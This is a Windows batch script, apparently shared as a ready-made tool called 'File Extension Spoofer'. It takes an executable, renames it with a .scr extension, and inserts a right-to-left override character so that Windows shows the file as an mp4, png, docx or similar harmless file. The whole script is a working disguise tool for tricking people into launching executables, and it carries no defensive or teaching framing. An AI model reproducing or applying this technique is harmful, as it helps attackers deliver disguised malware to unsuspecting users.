@echo off
mode 104,26
color 0f
chcp 65001 >nul
title Batch - File Extension Spoofer
:1
cls
echo.
echo.
echo    [40;92m            [40;97m `7MM"""Yp,[40;31m `7MM"""YMM `7MM"""YMM   .M"""bgd [40;97m
echo    [40;92m __________ [40;97m   MM    Yb[40;91m   MM    `7   MM    `7  ,MI    "Y [40;97m
echo    [40;92m/----------\[40;97m   MM    dP[40;31m   MM   d     MM   d    `MMb.     [40;97m
echo    [40;92m│    --=-- │[40;97m   MM"""bg.[40;91m   MM""MM     MMmmMM      `YMMNq. [40;97m
echo  [40;92m┌─┤o ======  ├[40;97m┄┄┄[40;97mMM    `Y[40;31m   MM   Y     MM   Y  , .     `MM [40;97m
echo  [40;92m│ │__________│[40;97m   MM    ,9[40;91m   MM         MM     ,M Mb     dM [40;97m
echo  [40;92m│              [40;97m .JMMmmmd9 [40;31m .JMML.     .JMMmmmmMMM P"Ybmmd"  [40;97m1.1
echo  [40;92m│
echo  [40;92m│
set /p path="[40;30m.[40;92m├[40;90m[ ? ] [40;97mExecutable file path:[40;90m "
if exist %path% (echo [40;30m.[40;92m├[40;90m[ + ] [40;92mFile found
) else (
echo [40;30m.[40;92m├[40;90m[ - ] [40;91mError, the file does not exist
pause>nul
goto 1
)
echo [40;30m.[40;92m├[40;90m[ ! ] [40;97mSupported extensions: [40;91mmp4, mp3, png, jpg, zip, docx, pptx, txt, rar
echo [40;30m.[40;92m├[40;90m[ ! ] [40;97mYou can use other extensions, but they are not officially supported
set /p newext="[40;30m.[40;92m├[40;90m[ ? ] [40;97mFake extension:[40;91m "
if %newext%==mp4 set newext=4pm
if %newext%==mp3 set newext=3pm
if %newext%==png set newext=gnp
if %newext%==jpg set newext=gpj
if %newext%==zip set newext=piz
if %newext%==txt set newext=txt
if %newext%==rar set newext=rar
if %newext%==docx set newext=xcod
if %newext%==pptx set newext=xtpp
for %%a in ("%path%") do (
echo [40;30m.[40;92m├[40;90m[ ! ] [40;97mTrying to spoof[40;91m %%~nxa[40;97m...
ren %path% %%~na‮%newext%.scr
)
echo [40;30m.[40;92m├[40;90m[ + ] [40;97mChanged the real extension to scr
echo [40;30m.[40;92m├[40;90m[ + ] [40;97mConverted the file name with RTLO
echo [40;30m.[40;92m├[40;90m[ + ] [40;92mFile has been successfully spoofed
pause>nul
goto 1